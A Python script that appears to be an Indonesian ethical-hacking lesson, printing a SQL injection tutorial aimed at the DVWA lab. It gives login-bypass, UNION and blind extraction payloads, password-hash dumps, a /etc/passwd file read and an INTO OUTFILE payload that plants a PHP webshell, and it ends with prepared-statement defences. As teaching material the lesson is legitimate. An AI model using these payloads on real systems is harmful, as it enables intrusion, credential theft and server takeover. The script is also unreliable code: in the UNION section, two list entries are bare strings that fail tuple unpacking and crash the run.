#!/usr/bin/env python3
"""Sesi 17: SQL Injection Manual — Complete Guide"""

import subprocess
import sys
import os
from datetime import datetime


def banner():
    print("=" * 60)
    print("  ETHICAL ELITE HACKER v11 — Sesi 17")
    print("  SQL Injection Manual — Complete Guide")
    print("=" * 60)
    print("  Referensi: X-Code Ethical Elite Hacker v11")
    print("=" * 60)


def check_tool(name):
    try:
        subprocess.check_output([name, "--version"], stderr=subprocess.STDOUT, timeout=5)
        return "✅ TERINSTAL"
    except (subprocess.CalledProcessError, FileNotFoundError, OSError):
        try:
            subprocess.check_output(["which", name], stderr=subprocess.STDOUT, timeout=5)
            return "✅ TERINSTAL"
        except (subprocess.CalledProcessError, FileNotFoundError, OSError):
            return "❌ TIDAK TERINSTAL"


def section(num, title):
    print(f"\n{'─' * 50}")
    print(f"  [{num}] {title}")
    print(f"{'─' * 50}")


# ── [1] SQL Injection Overview ──
def sqli_overview():
    print("""
  💡 SQL INJECTION adalah kerentanan web yang terjadi ketika
     attacker bisa menyuntikkan perintah SQL ke query database
     melalui input user yang tidak divalidasi.

   ╔═══════════════════════════════════════════════════════╗
   ║  🔑 RESEPSIONIS HOTEL KASI SEMUA KUNCI              ║
   ║     Bayangkan: Kamu ke hotel, bilang \"Saya tamu di   ║
   ║     kamar 1 ATAU 1=1\". Resepsionis kasi kunci       ║
   ║     SEMUA KAMAR! Karena 1=1 selalu benar.            ║
   ║     That's SQL Injection!                            ║
   ╚═══════════════════════════════════════════════════════╝

  Dampak:
    • Bypass login (akses tanpa password)
    • Bocor data sensitif (user, password hash, credit card)
    • MODIFY data (ubah saldo, privilege user)
    • DELETE data (drop tables, hapus database)
    • RCE (via INTO OUTFILE, xp_cmdshell di MSSQL)
    """)


# ── [2] Tautology Login Bypass ──
def tautology_demo():
    print("  💡 TAUTOLOGY (LOGIN BYPASS):\n")

    print("""
  Tautology = kondisi yang SELALU BENAR (1=1, 'a'='a').
  Attacker memanfaatkan ini untuk bypass autentikasi.

  Query asli:
    SELECT * FROM users WHERE username='USER' AND password='PASS'

  Dengan injeksi:
    SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'

  Karena '1'='1' selalu TRUE → seluruh WHERE clause jadi TRUE
  → SEMUA baris dikembalikan → login sebagai user PERTAMA (admin)!
    """)

    print("  Demo simulasi:\n")

    print(f"  {'Username':<25} {'Password':<30} {'Query':<55} {'Hasil':<20}")
    print(f"  {'─' * 130}")

    attempts = [
        ("admin", "password123",                     "SELECT * FROM users WHERE username='admin' AND password='password123'", "❌ Gagal"),
        ("admin", "'' OR '1'='1' -- ",              "SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1' -- ", "✅ Login!"),
        ("' OR 1=1 -- ", "''",                        "SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password=''",      "✅ Login!"),
        ("admin' --", "''",                           "SELECT * FROM users WHERE username='admin' -- ' AND password=''",          "✅ Login!"),
        ("admin'#", "''",                             "SELECT * FROM users WHERE username='admin'#' AND password=''",             "✅ Login!"),
    ]
    for user, pwd, query, hasil in attempts:
        q_short = query[:52] + ".." if len(query) > 52 else query
        print(f"  {user:<25} {pwd:<30} {q_short:<55} {hasil:<20}")
    print()

    print("  🔥 Variasi tautology payload:\n")
    tautology_payloads = [
        ("' OR '1'='1' -- ",     "Klasik — komentar dengan --"),
        ("' OR 1=1 -- ",         "Tanpa kutip string"),
        ("' OR 'a'='a",          "Tanpa komentar (tutup kutip aja)"),
        ("' OR 1=1 #",           "MySQL: # = komentar"),
        ('" OR 1=1 -- ',         "Untuk query pake kutip ganda"),
        (") OR 1=1 -- ",         "Jika parameter di dalam kurung"),
        ("' OR 1=1 LIMIT 1 -- ", "Ambil baris pertama aja"),
    ]
    for payload, desc in tautology_payloads:
        print(f"     👉 {payload:<35} → {desc}")
    print()


# ── [3] Column Enumeration ──
def column_enum():
    print("  💡 MENENTUKAN JUMLAH KOLOM (ORDER BY):\n")

    print("""
  Sebelum UNION-based, kita perlu tahu jumlah kolom yang
  dikembalikan query original. Gunakan ORDER BY:

    ?id=1 ORDER BY 1 --   → normal
    ?id=1 ORDER BY 2 --   → normal
    ?id=1 ORDER BY 3 --   → normal
    ?id=1 ORDER BY 4 --   → ERROR! → berarti 3 kolom!

  Atau pakai UNION SELECT:
    ?id=1 UNION SELECT 1 --      → error
    ?id=1 UNION SELECT 1,2 --    → error
    ?id=1 UNION SELECT 1,2,3 --  → OK → 3 kolom!
    """)

    print("  Demo enumerasi kolom:\n")
    print(f"  {'Payload':<35} {'Response':<30} {'Artinya':<30}")
    print(f"  {'─' * 95}")
    enum_demo = [
        ("?id=1 ORDER BY 1 -- ",    "✅ Normal",          "Query valid"),
        ("?id=1 ORDER BY 2 -- ",    "✅ Normal",          "Query valid"),
        ("?id=1 ORDER BY 3 -- ",    "✅ Normal",          "Query valid"),
        ("?id=1 ORDER BY 4 -- ",    "❌ Error/blank",     "Kolom cuma 3!"),
        ("?id=1 UNION SELECT 1 -- ","❌ Error",            "Jumlah kolom beda"),
        ("?id=1 UNION SELECT 1,2,3 -- ","✅ Normal",      "3 kolom ditemukan!"),
    ]
    for payload, resp, arti in enum_demo:
        print(f"  {payload:<35} {resp:<30} {arti:<30}")
    print()


# ── [4] UNION-Based Extraction ──
def union_based():
    print("  💡 UNION-BASED SQL INJECTION:\n")

    print("""
  🔥 UNION memungkinkan kita menggabungkan hasil query asli
     dengan query kita sendiri!

  Syarat:
    1. Jumlah kolom harus SAMA antara query asli & UNION
    2. Tipe data kolom harus kompatibel
    3. Kita perlu tahu posisi kolom yang TAMPIL di halaman

  Langkah:
    1. Cari jumlah kolom (ORDER BY / UNION SELECT)
    2. Cari posisi kolom yang tampil (UNION SELECT 1,2,3)
    3. Ganti angka dengan data yang kita mau
    """)

    print("  Demo UNION Extraction:\n")

    print("  Step 1: Cari posisi kolom yang tampil\n")
    print(f"    {'Input':<45} → {'Output':<40}")
    print(f"    {'─' * 85}")
    print(f"    {'?id=1 UNION SELECT 1,2,3 -- ':45} → {'ID: 1 | Name: 2 | Phone: 3':<40}")
    print()

    print("  Step 2: Ekstrak data database\n")
    print(f"    {'Payload':<55} → {'Hasil':<40}")
    print(f"    {'─' * 95}")

    extractions = [
        ("?id=1 UNION SELECT 1,@@version,3 -- ",              "Version: 8.0.32"),
        ("?id=1 UNION SELECT 1,database(),3 -- ",             "Database: dvwa"),
        ("?id=1 UNION SELECT 1,user(),3 -- ",                 "User: root@localhost"),
        ("?id=1 UNION SELECT 1,@@datadir,3 -- ",              "Data dir: /var/lib/mysql/"),
        ("?id=1 UNION SELECT 1,group_concat(table_name),3",   "Tables: users,guestbook,etc"),
        ("  FROM information_schema.tables WHERE table_schema=database() --"),
        ("?id=1 UNION SELECT 1,group_concat(column_name),3",  "Columns: user_id,first_name,"),
        ("  FROM information_schema.columns WHERE table_name='users' --"),
    ]
    for payload, hasil in extractions:
        p_short = payload[:52] + ".." if len(payload) > 52 else payload
        print(f"    {p_short:<55} → {hasil:<40}")
    print()

    print("  Step 3: Dump data sensitif\n")
    print("""    ?id=1 UNION SELECT 1, group_concat(user_id,0x3a,user,0x3a,password), 3
           FROM users --\n""")
    print(f"    {'Payload':<60} {'Output':<45}")
    print(f"    {'─' * 105}")
    print(f"    {'UNION extract user:password':<60} {'1:admin:5f4dcc3b5aa765d61d8327deb882cf99,':<45}")
    print(f"    {'':<60} {'2:gordonb:e99a18c428cb38d5f260853678922e03,...':<45}")
    print()


# ── [5] information_schema Deep Dive ──
def info_schema():
    print("  💡 INFORMATION_SCHEMA — Database Metadata:\n")

    print("""
  information_schema adalah database bawaan MySQL/MariaDB
  yang menyimpan METADATA tentang semua database, tabel,
  kolom, dan privilege.

  Tabel penting di information_schema:
    • SCHEMATA        → Daftar semua database
    • TABLES          → Daftar tabel di setiap database
    • COLUMNS         → Daftar kolom di setiap tabel
    • USER_PRIVILEGES → Privilege user MySQL
    • PROCESSLIST     → Query yang sedang berjalan
    """)

    print(f"  {'Query':<65} {'Info Didapat':<40}")
    print(f"  {'─' * 105}")

    info_queries = [
        ("SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA",             "Semua database: information_schema, mysql, dvwa, wordpress"),
        ("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES",                "Semua tabel: users, posts, wp_options, etc"),
        ("  WHERE TABLE_SCHEMA='dvwa'",                                     ""),
        ("SELECT COLUMN_NAME, COLUMN_TYPE FROM INFORMATION_SCHEMA.COLUMNS", "Semua kolom + tipe data"),
        ("  WHERE TABLE_NAME='users'",                                      ""),
        ("SELECT TABLE_NAME, ENGINE FROM INFORMATION_SCHEMA.TABLES",        "Tabel + engine (InnoDB/MyISAM)"),
        ("  WHERE TABLE_SCHEMA='dvwa'",                                     ""),
        ("SELECT USER, HOST FROM MYSQL.USER",                               "Semua user MySQL"),
        ("SELECT LOAD_FILE('/etc/passwd')",                                 "Baca file server (jika priv cukup)"),
    ]
    for query, info in info_queries:
        q_short = query[:62] + ".." if len(query) > 62 else query
        print(f"  {q_short:<65} {info:<40}")
    print()

    print("  🔥 GROUP_CONCAT — Gabung semua hasil jadi satu baris:\n")
    print("""    ' UNION SELECT 1, group_concat(table_name SEPARATOR '<br>'), 3
      FROM information_schema.tables WHERE table_schema=database() --\n""")
    print("     Tanpa GROUP_CONCAT → dapat 1 baris per tabel (scroll panjang)")
    print("     Dengan GROUP_CONCAT → semua tabel dalam 1 output!")
    print()


# ── [6] Blind SQLi Technique ──
def blind_sqli():
    print("  💡 BLIND SQL INJECTION:\n")

    print("""
   ╔═══════════════════════════════════════════════════════╗
   ║  ❓ TANYA BENER-SALAH                                ║
   ║     Analogi: Kamu nebak password seseorang dengan    ║
   ║     cara nanya "Apakah huruf pertama 'a'?"           ║
   ║     Kalo iya -> reaksi A, kalo bukan -> reaksi B.   ║
   ║                                                        ║
   ║     Blind SQLi = Kita gak lihat data langsung,       ║
   ║     tapi bisa nebak karakter per karakter            ║
   ║     berdasarkan reaksi server (TRUE/FALSE).          ║
   ╚═══════════════════════════════════════════════════════╝

  Tipe Blind SQLi:
    • Content-based  → halaman normal vs error/kosong
    • Time-based     → ada delay vs tidak ada delay
    • Error-based    → error message mengandung data
    """)

    print("  Demo Blind SQLi — Content-based:\n")

    target_pwd = "secret99"
    print(f"  Target password: {target_pwd}")
    print()

    print(f"  {'Tebakan':<35} {'Payload':<55} {'Reaksi':<20}")
    print(f"  {'─' * 110}")

    # Simulasi blind tebak huruf
    for i in range(1, min(len(target_pwd) + 1, 6)):
        for c in "abcdefghijklmnopqrstuvwxyz0123456789":
            payload = f"' AND SUBSTRING((SELECT password FROM users LIMIT 1),{i},1)='{c}' -- "
            match = (c == target_pwd[i - 1])
            reaksi = "✅ Normal (BENAR)" if match else "❌ Blank (SALAH)"
            if match:
                p_short = payload[:52] + ".." if len(payload) > 52 else payload
                print(f"  Huruf ke-{i}='{c}': {p_short:<55} {reaksi:<20}")
                break

    print()
    print("  💡 Blind SQLi function yang sering dipakai:\n")
    print(f"  {'Function':<30} {'Kegunaan':<50} {'Contoh':<30}")
    print(f"  {'─' * 110}")
    funcs = [
        ("SUBSTRING()",  "Ambil substring dari hasil query",    "SUBSTRING(password,1,1)"),
        ("ASCII()",      "Ambil ASCII value karakter",          "ASCII(SUBSTRING(password,1,1))"),
        ("LENGTH()",     "Cek panjang data",                   "LENGTH(password)"),
        ("IF()",         "Kondisional: IF(kondisi, A, B)",      "IF(1=1, SLEEP(5), 0)"),
        ("BENCHMARK()",  "Eksekusi berulang (time-based)",      "BENCHMARK(5000000, MD5('test'))"),
    ]
    for func, kegunaan, contoh in funcs:
        print(f"  {func:<30} {kegunaan:<50} {contoh:<30}")
    print()


# ── [7] Time-Based Blind ──
def time_based():
    print("  💡 TIME-BASED BLIND SQLI:\n")

    print("""
  ╔═══════════════════════════════════════════════════════╗
  ║  ⏰ NGETOK PINTU                                     ║
  ║     Bayangkan: Kamu ngetok pintu. Kalo ada orang     ║
  ║     di dalam, mereka buka 5 detik kemudian.          ║
  ║     Kalo kosong, langsung respon.                    ║
  ║                                                        ║
  ║     Time-based SQLi: Kalo kondisi TRUE → sleep 5s    ║
  ║     Kalo FALSE → respon cepat.                       ║
  ╚═══════════════════════════════════════════════════════╝
    """)

    print("  Payload dasar:\n")
    print("    ' OR IF(1=1, SLEEP(5), 0) --  → delay 5 detik (TRUE)")
    print("    ' OR IF(1=2, SLEEP(5), 0) --  → langsung respon (FALSE)")
    print()

    print("  Demo tebak password dengan time-based:\n")
    print(f"  {'Payload':<70} {'Delay':<15} {'Artinya':<20}")
    print(f"  {'─' * 105}")

    time_payloads = [
        ("' OR IF(LENGTH((SELECT password FROM users LIMIT 1))=8, SLEEP(3), 0) -- ", "3 detik", "✅ Password 8 karakter"),
        ("' OR IF(LENGTH((SELECT password FROM users LIMIT 1))=9, SLEEP(3), 0) -- ", "Langsung", "❌ Bukan 9 karakter"),
        ("' OR IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(3), 0) -- ", "3 detik", "✅ Huruf pertama 'a'"),
        ("' OR IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='b', SLEEP(3), 0) -- ", "Langsung", "❌ Bukan 'b'"),
        ("' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(3), 0) -- ", "3 detik", "✅ ASCII 97 = 'a'"),
    ]
    for payload, delay, artinya in time_payloads:
        p_short = payload[:67] + ".." if len(payload) > 67 else payload
        print(f"  {p_short:<70} {delay:<15} {artinya:<20}")
    print()

    print("  💡 Tips time-based di MySQL:")
    print("     • SLEEP(n) → delay n detik (paling umum)")
    print("     • BENCHMARK(n, expr) → ulang expr n kali (alternatif)")
    print("     • WAITFOR DELAY '0:0:5' → MSSQL version")
    print("     • pg_sleep(5) → PostgreSQL version")
    print()


# ── [8] Payload Table ──
def payload_table():
    print("  💡 KOLEKSI PAYLOAD SQLI:\n")

    print(f"  {'Kategori':<25} {'Payload':<55} {'Keterangan':<25}")
    print(f"  {'─' * 105}")
    payloads = [
        ("Login Bypass",        "' OR '1'='1' --",                      "Bypass autentikasi"),
        ("Login Bypass 2",      "admin' --",                            "Komentari sisa query"),
        ("Column Count",        "' ORDER BY 5 --",                      "Cari jumlah kolom"),
        ("Union Find",          "' UNION SELECT 1,2,3,4,5 --",          "Cari posisi tampil"),
        ("DB Version",          "' UNION SELECT @@version,2,3 --",      "Versi database"),
        ("Current DB",          "' UNION SELECT database(),2,3 --",     "Nama database aktif"),
        ("Current User",        "' UNION SELECT user(),2,3 --",         "User database"),
        ("List Tables",         "' UNION SELECT table_name,2,3 FROM",    "Semua tabel"),
        ("  (cont)",            "  information_schema.tables --",        ""),
        ("List Columns",        "' UNION SELECT column_name,2,3 FROM",   "Semua kolom"),
        ("  (cont)",            "  information_schema.columns WHERE",    ""),
        ("  (cont)",            "  table_name='users' --",              ""),
        ("Dump Data",           "' UNION SELECT user,password FROM",     "Bocor username+password"),
        ("  (cont)",            "  users --",                            ""),
        ("Concat Dump",         "' UNION SELECT group_concat(user,0x3a,", "Gabung hasil"),
        ("  (cont)",            "  password),2,3 FROM users --",         ""),
        ("Read File",           "' UNION SELECT LOAD_FILE('/etc/passwd'),", "Baca file server"),
        ("  (cont)",            "  2,3 --",                              ""),
        ("Into Outfile",        "' UNION SELECT '', '<?php system(",     "Write webshell"),
        ("  (cont)",            "  $_GET[\\'cmd\\']); ?>', '' INTO",      ""),
        ("  (cont)",            "  OUTFILE '/var/www/shell.php' --",     ""),
        ("Time Blind",          "' OR IF(1=1, SLEEP(5), 0) --",         "Time-based detection"),
        ("Blind Extract",       "' AND SUBSTRING((SELECT password FROM", "Blind tebak karakter"),
        ("  (cont)",            "  users LIMIT 1),1,1)='a' --",        ""),
        ("Error Based",         "' AND EXTRACTVALUE(1,",                 "Error-based extraction"),
        ("  (cont)",            "  CONCAT(0x7e,(SELECT password))) --", ""),
    ]
    for kategori, payload, keterangan in payloads:
        p_short = payload[:52] + ".." if len(payload) > 52 else payload
        print(f"  {kategori:<25} {p_short:<55} {keterangan:<25}")
    print()


# ── [9] Prevention: Prepared Statements ──
def prevention():
    print("  💡 PENCEGAHAN — PREPARED STATEMENTS:\n")

    print("""
  ╔═══════════════════════════════════════════════════════╗
  ║  🛡️  Prepared Statement = Tameng PALING UTAMA        ║
  ║                                                        ║
  ║  Prinsip: PISAHKAN query SQL dari DATA user!          ║
  ║                                                        ║
  ║  Query SQL → template dengan placeholder (?)          ║
  ║  Data user → dikirim terpisah, di-escape otomatis     ║
  ║                                                        ║
  ║  Bahkan jika user input: ' OR '1'='1'                 ║
  ║  → Dianggap DATA, bukan SQL!                          ║
  ╚═══════════════════════════════════════════════════════╝
    """)

    print("  Perbandingan kode:\n")

    print("  🔴 RENTAN (string concatenation):\n")
    print("""    <?php
    $username = $_POST['username'];
    $password = $_POST['password'];

    // 🔴 JANGAN! Input user langsung digabung ke SQL!
    $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    $result = mysqli_query($conn, $query);
    ?>
    """)

    print("  ✅ AMAN (prepared statement):\n")
    print("""    <?php
    $username = $_POST['username'];
    $password = $_POST['password'];

    // ✅ Prepared statement — query & data dipisah!
    $stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
    $stmt->bind_param("ss", $username, $password);
    $stmt->execute();
    $result = $stmt->get_result();
    ?>
    """)

    print(f"  {'Metode':<30} {'Cara Kerja':<50} {'Keamanan':<20}")
    print(f"  {'─' * 100}")
    defenses = [
        ("Prepared Statement",  "Query template + parameter terpisah",      "✅✅ Sangat Aman"),
        ("Stored Procedure",    "Query di database, panggil via CALL",      "✅✅ Sangat Aman"),
        ("ORM (Eloquent)",      "Abstraksi database, auto-prepared",        "✅✅ Sangat Aman"),
        ("Escape String",       "mysql_real_escape_string()",               "⚠️  Kurang recommended"),
        ("Input Validation",    "Cek tipe/panjang/format input",           "⚠️  Lapisan tambahan"),
        ("WAF",                 "Filter SQLi di layer HTTP",                "⚠️  Lapisan tambahan"),
        ("Least Privilege",     "User DB cuma punya akses minimal",         "✅  Kurangi dampak"),
    ]
    for metode, cara, keamanan in defenses:
        print(f"  {metode:<30} {cara:<50} {keamanan:<20}")
    print()


# ── [10] Analogi ──
def analogi():
    print("""
   ╔══════════════════════════════════════════════════════════╗
   ║   📝 ANALOGI LENGKAP SQL INJECTION                     ║
   ║                                                        ║
   ║   Tautology = RESEPSIONIS KASI SEMUA KUNCI             ║
   ║     "Saya tamu di kamar 1 ATAU 1=1" → semua kamar!    ║
   ║                                                        ║
   ║   UNION = GABUNGIN KTP + KARTU KREDIT                  ║
   ║     Data kamar 101 digabung dengan data brankas        ║
   ║     manager. Semua informasi bocor.                    ║
   ║                                                        ║
   ║   Blind (content) = TANYA BENER-SALAH                  ║
   ║     "Apakah huruf pertama password 'a'?"               ║
   ║     Cek reaksi: normal = BENAR, blank = SALAH          ║
   ║                                                        ║
   ║   Blind (time) = NGETOK PINTU                          ║
   ║     "Ada orang?" Kalo ada → buka 5 detik.              ║
   ║     Kalo kosong → langsung respon.                     ║
   ║                                                        ║
   ║   Prepared Statement = CUSTOMER SERVICE                ║
   ║     Pelanggan ngomong, CS yg nulis — gak bisa         ║
   ║     nyelipin perintah di sela-sela omongan.            ║
   ╚══════════════════════════════════════════════════════════╝
    """)


def main():
    banner()

    # ── [1] Overview ──
    section(1, "APA ITU SQL INJECTION?")
    sqli_overview()

    # ── [2] Tautology ──
    section(2, "TAUTOLOGY — LOGIN BYPASS")
    tautology_demo()

    # ── [3] Column Enumeration ──
    section(3, "COLUMN ENUMERATION (ORDER BY / UNION)")
    column_enum()

    # ── [4] UNION-Based ──
    section(4, "UNION-BASED DATA EXTRACTION")
    union_based()

    # ── [5] information_schema ──
    section(5, "INFORMATION_SCHEMA EXPLOITATION")
    info_schema()

    # ── [6] Blind SQLi ──
    section(6, "BLIND SQL INJECTION (CONTENT-BASED)")
    blind_sqli()

    # ── [7] Time-Based Blind ──
    section(7, "TIME-BASED BLIND SQLI")
    time_based()

    # ── [8] Payload Table ──
    section(8, "KOLEKSI PAYLOAD SQLI")
    payload_table()

    # ── [9] Prevention ──
    section(9, "PENCEGAHAN — PREPARED STATEMENT")
    prevention()

    # ── [10] Analogi ──
    section(10, "ANALOGI LENGKAP")
    analogi()

    # ── Summary ──
    print("=" * 60)
    print("  ✅ SESI 17 SELESAI!")
    print("=" * 60)
    print("  👉 Recap:")
    print("    • Tautology: ' OR '1'='1' — bypass login dengan kondisi selalu benar")
    print("    • Column Enum: ORDER BY / UNION SELECT untuk cari jumlah kolom")
    print("    • UNION: Gabung query attacker dengan query asli → ekstrak data")
    print("    • information_schema: Metadata database — tabel, kolom, user")
    print("    • Blind SQLi (content): Tebak karakter per karakter via TRUE/FALSE")
    print("    • Blind SQLi (time): Tebak via delay SLEEP() — IF(kondisi, sleep, 0)")
    print("    • Error-based: Pakai error message untuk exfiltrasi data")
    print("    • Prevention: Prepared statement (PALING UTAMA), least privilege")
    print()
    print("  📌 LATIHAN LANJUTAN:")
    print("    1. DVWA SQL Injection: coba ' OR '1'='1' -- (login bypass)")
    print("    2. Cari jumlah kolom: ' ORDER BY 1-- naikkan sampai error")
    print("    3. UNION extract: ' UNION SELECT user,password FROM users#")
    print("    4. Cari tabel di information_schema via UNION")
    print("    5. Blind SQLi: ' AND SUBSTRING((SELECT password LIMIT 1),1,1)='a' --")
    print("    6. Time blind: ' OR IF(1=1, SLEEP(5), 0) --")
    print("    7. SQLite: cek sqlite_version(), sqlite_master table")
    print("    8. PostgreSQL: cek version(), pg_tables, current_database()")
    print("    9. MSSQL: cek @@version, sysobjects, waitfor delay")
    print("    10. Baca OWASP SQL Injection Prevention Cheat Sheet")
    print("=" * 60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
